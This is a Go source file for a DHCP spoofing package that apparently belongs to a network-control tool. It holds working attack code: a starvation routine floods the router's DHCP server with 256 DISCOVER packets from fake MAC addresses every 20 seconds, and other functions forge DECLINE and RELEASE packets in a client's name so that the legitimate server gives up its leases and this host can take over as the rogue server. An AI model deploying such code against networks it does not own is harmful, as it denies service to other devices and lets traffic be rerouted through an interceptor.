package dhcp4_spoofer

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"net"
	"net/netip"
	"syscall"
	"time"

	"github.com/deeGraYve/packet"
)

var (
	nextAttack = time.Now()
	fakeMAC    = net.HardwareAddr{0xff, 0xee, 0xdd, 0xcc, 0xbb, 0x0}
)

func (h *Handler) attackDHCPServer(options packet.DHCP4Options) {
	if nextAttack.After(time.Now()) {
		return
	}

	xID := []byte{0xff, 0xee, 0xdd, 0}
	tmpMAC := net.HardwareAddr{0xff, 0xee, 0xdd, 0xcc, 0xbb, 0x0}
	copy(fakeMAC[:], tmpMAC) // keep for comparison

	for i := 0; i < 256; i++ {
		xID[3] = byte(i)
		tmpMAC[5] = byte(i)
		h.SendDiscoverPacket(tmpMAC, packet.IPv4zero, xID, "")
	}

	// Wait a few seconds before storming again
	nextAttack = time.Now().Add(time.Second * 20)
}

// forceDecline send a fake decline packet to force release of the IP so the
// client has to discover again when trying to renew.
//
// In most cases the home dhcp will mark the entry but keep the entry in the table
// This is an error state and the DHCP server should tell the administrator
func (h *Handler) forceDecline(clientID []byte, serverIP netip.Addr, chAddr net.HardwareAddr, clientIP netip.Addr, xid []byte) {
	Logger.Msg("client send decline to server").ByteArray("xid", xid).ByteArray("clientid", clientID).IP("ip", clientIP).Write()

	// use a copy in the goroutine
	clientID = dupBytes(clientID)
	chAddr = dupMAC(chAddr)
	ciAddr := packet.IPv4zero // as per rfc
	// serverIP = serverIP
	xid = dupBytes(xid)
	opts := packet.DHCP4Options{}
	opts[packet.DHCP4OptionClientIdentifier] = clientID
	opts[packet.DHCP4OptionServerIdentifier] = serverIP.AsSlice()
	opts[packet.DHCP4OptionMessage] = []byte("netfilter decline")
	opts[packet.DHCP4OptionRequestedIPAddress] = []byte(clientIP.AsSlice())
	go func() {
		err := h.sendDeclineReleasePacket(packet.DHCP4Decline, clientID, serverIP, chAddr, ciAddr, xid, opts)
		if err != nil {
			fmt.Println("dhcp4: error in send decline packet ", err)
		}

	}()
}

// forceRelease send a fake release packet to force release of the IP so the
// client has to discover again when trying to renew.
//
// # In most cases the home dhcp will drop the entry and will have an empty dhcp table
//
// Jan 21 - NOT working; the test router does not drop the entry. WHY?
func (h *Handler) forceRelease(clientID []byte, serverIP netip.Addr, chAddr net.HardwareAddr, clientIP netip.Addr, xid []byte) {
	Logger.Msg("client send release to server").ByteArray("xid", xid).ByteArray("clientid", clientID).IP("ip", clientIP).Write()

	chAddr = dupMAC(chAddr)
	clientID = dupBytes(clientID)
	xid = dupBytes(xid)
	opts := packet.DHCP4Options{}
	opts[packet.DHCP4OptionClientIdentifier] = clientID
	opts[packet.DHCP4OptionServerIdentifier] = serverIP.AsSlice()
	opts[packet.DHCP4OptionMessage] = []byte("netfilter release")

	go func() {
		err := h.sendDeclineReleasePacket(packet.DHCP4Release, clientID, serverIP, chAddr, clientIP, xid, nil)
		if err != nil {
			fmt.Println("dhcp4: error in send release packet ", err)
		}

	}()
}

func mustXID(xid []byte) []byte {
	if xid == nil {
		xid = make([]byte, 4)
		if _, err := rand.Read(xid); err != nil {
			panic(err)
		}
	}
	return xid
}

func (h *Handler) sendDeclineReleasePacket(msgType packet.DHCP4MessageType, clientID []byte, serverIP netip.Addr, chAddr net.HardwareAddr, ciAddr netip.Addr, xid []byte, options packet.DHCP4Options) (err error) {
	b := packet.EtherBufferPool.Get().(*[packet.EthMaxSize]byte)
	defer packet.EtherBufferPool.Put(b)
	xid = mustXID(xid)
	p := packet.EncodeDHCP4(b[0:], packet.DHCP4BootRequest, msgType, chAddr, ciAddr, packet.IPv4zero, xid, false, options, nil)

	srcAddr := packet.Addr{MAC: h.session.NICInfo.HostAddr4.MAC, IP: h.session.NICInfo.HostAddr4.IP, Port: packet.DHCP4ClientPort}
	dstAddr := packet.Addr{MAC: h.session.NICInfo.RouterAddr4.MAC, IP: h.session.NICInfo.RouterAddr4.IP, Port: packet.DHCP4ServerPort}
	err = sendDHCP4Packet(h.session.Conn, srcAddr, dstAddr, p)
	return err
}

// SendDiscoverPacket send a DHCP discover packet to target
func (h *Handler) SendDiscoverPacket(chAddr net.HardwareAddr, ciAddr netip.Addr, xid []byte, name string) (err error) {
	if Logger.IsDebug() {
		Logger.Msg("send discover packet").ByteArray("xid", xid).MAC("from", chAddr).IP("ciaddr", ciAddr).Write()
	}
	// Commond options seen on many dhcp clients
	options := packet.DHCP4Options{}
	if name != "" {
		options[packet.DHCP4OptionHostName] = []byte(name)
	}
	options[packet.DHCP4OptionParameterRequestList] = []byte{
		byte(packet.DHCP4OptionDHCPMessageType), byte(packet.DHCP4OptionSubnetMask),
		byte(packet.DHCP4OptionClasslessRouteFormat), byte(packet.DHCP4OptionRouter),
		byte(packet.DHCP4OptionDomainNameServer), byte(packet.DHCP4OptionDomainName),
	}

	srcAddr := packet.Addr{MAC: h.session.NICInfo.HostAddr4.MAC, IP: h.session.NICInfo.HostAddr4.IP, Port: packet.DHCP4ClientPort}
	dstAddr := packet.Addr{MAC: h.session.NICInfo.RouterAddr4.MAC, IP: h.session.NICInfo.RouterAddr4.IP, Port: packet.DHCP4ServerPort}

	b := packet.EtherBufferPool.Get().(*[packet.EthMaxSize]byte)
	defer packet.EtherBufferPool.Put(b)
	ether := packet.Ether(b[0:])
	ether = packet.EncodeEther(ether, syscall.ETH_P_IP, srcAddr.MAC, dstAddr.MAC)
	ip4 := packet.EncodeIP4(ether.Payload(), 50, srcAddr.IP, dstAddr.IP)
	udp := packet.EncodeUDP(ip4.Payload(), srcAddr.Port, dstAddr.Port)
	dhcp := packet.EncodeDHCP4(udp.Payload(), packet.DHCP4BootRequest, packet.DHCP4Discover, chAddr, ciAddr, packet.IPv4zero, xid, false, options, nil)
	udp = udp.SetPayload(dhcp)
	ip4 = ip4.SetPayload(udp, syscall.IPPROTO_UDP)
	if ether, err = ether.SetPayload(ip4); err != nil {
		return err
	}
	if _, err := h.session.Conn.WriteTo(ether, &dstAddr); err != nil {
		fmt.Println("icmp failed to write ", err)
		return err
	}
	return nil
}

func (h *Handler) processClientPacket(host *packet.Host, req packet.DHCP4) error {
	if err := req.IsValid(); err != nil {
		return err
	}

	options := req.ParseOptions()
	t := options[packet.DHCP4OptionDHCPMessageType]
	if len(t) != 1 {
		fmt.Println("dhcp4: skiping dhcp packet with option len not 1")
		return packet.ErrParseFrame
	}

	clientID := getClientID(req, options)
	serverIP := packet.IPv4zero
	if tmp, ok := options[packet.DHCP4OptionServerIdentifier]; ok {
		serverIP, _ = netip.AddrFromSlice(tmp)
	}

	if !serverIP.IsValid() || serverIP.IsUnspecified() {
		fmt.Printf("dhcp4: error client offer invalid serverIP=%v clientID=%v\n", serverIP, clientID)
		return packet.ErrParseFrame
	}

	reqType := packet.DHCP4MessageType(t[0])

	// An offer for a fakeMAC that we initiated? Discard it.
	if bytes.Equal(req.CHAddr()[0:4], fakeMAC[0:4]) {
		return nil
	}

	// Did we send this?
	if serverIP == h.net1.DHCPServer || serverIP == h.net2.DHCPServer {
		return nil
	}

	// only interested in offer packets
	if reqType != packet.DHCP4Offer {
		return nil
	}

	Logger.Msg("client offer from another dhcp server").ByteArray("xid", req.XId()).ByteArray("clientid", clientID).IP("ip", req.YIAddr()).Write()

	// Force dhcp server to release the IP
	if h.mode == ModeSecondaryServer || (h.mode == ModeSecondaryServerNice && h.session.IsCaptured(req.CHAddr())) {
		h.forceDecline(clientID, serverIP, req.CHAddr(), req.YIAddr(), req.XId())
	}
	return nil
}
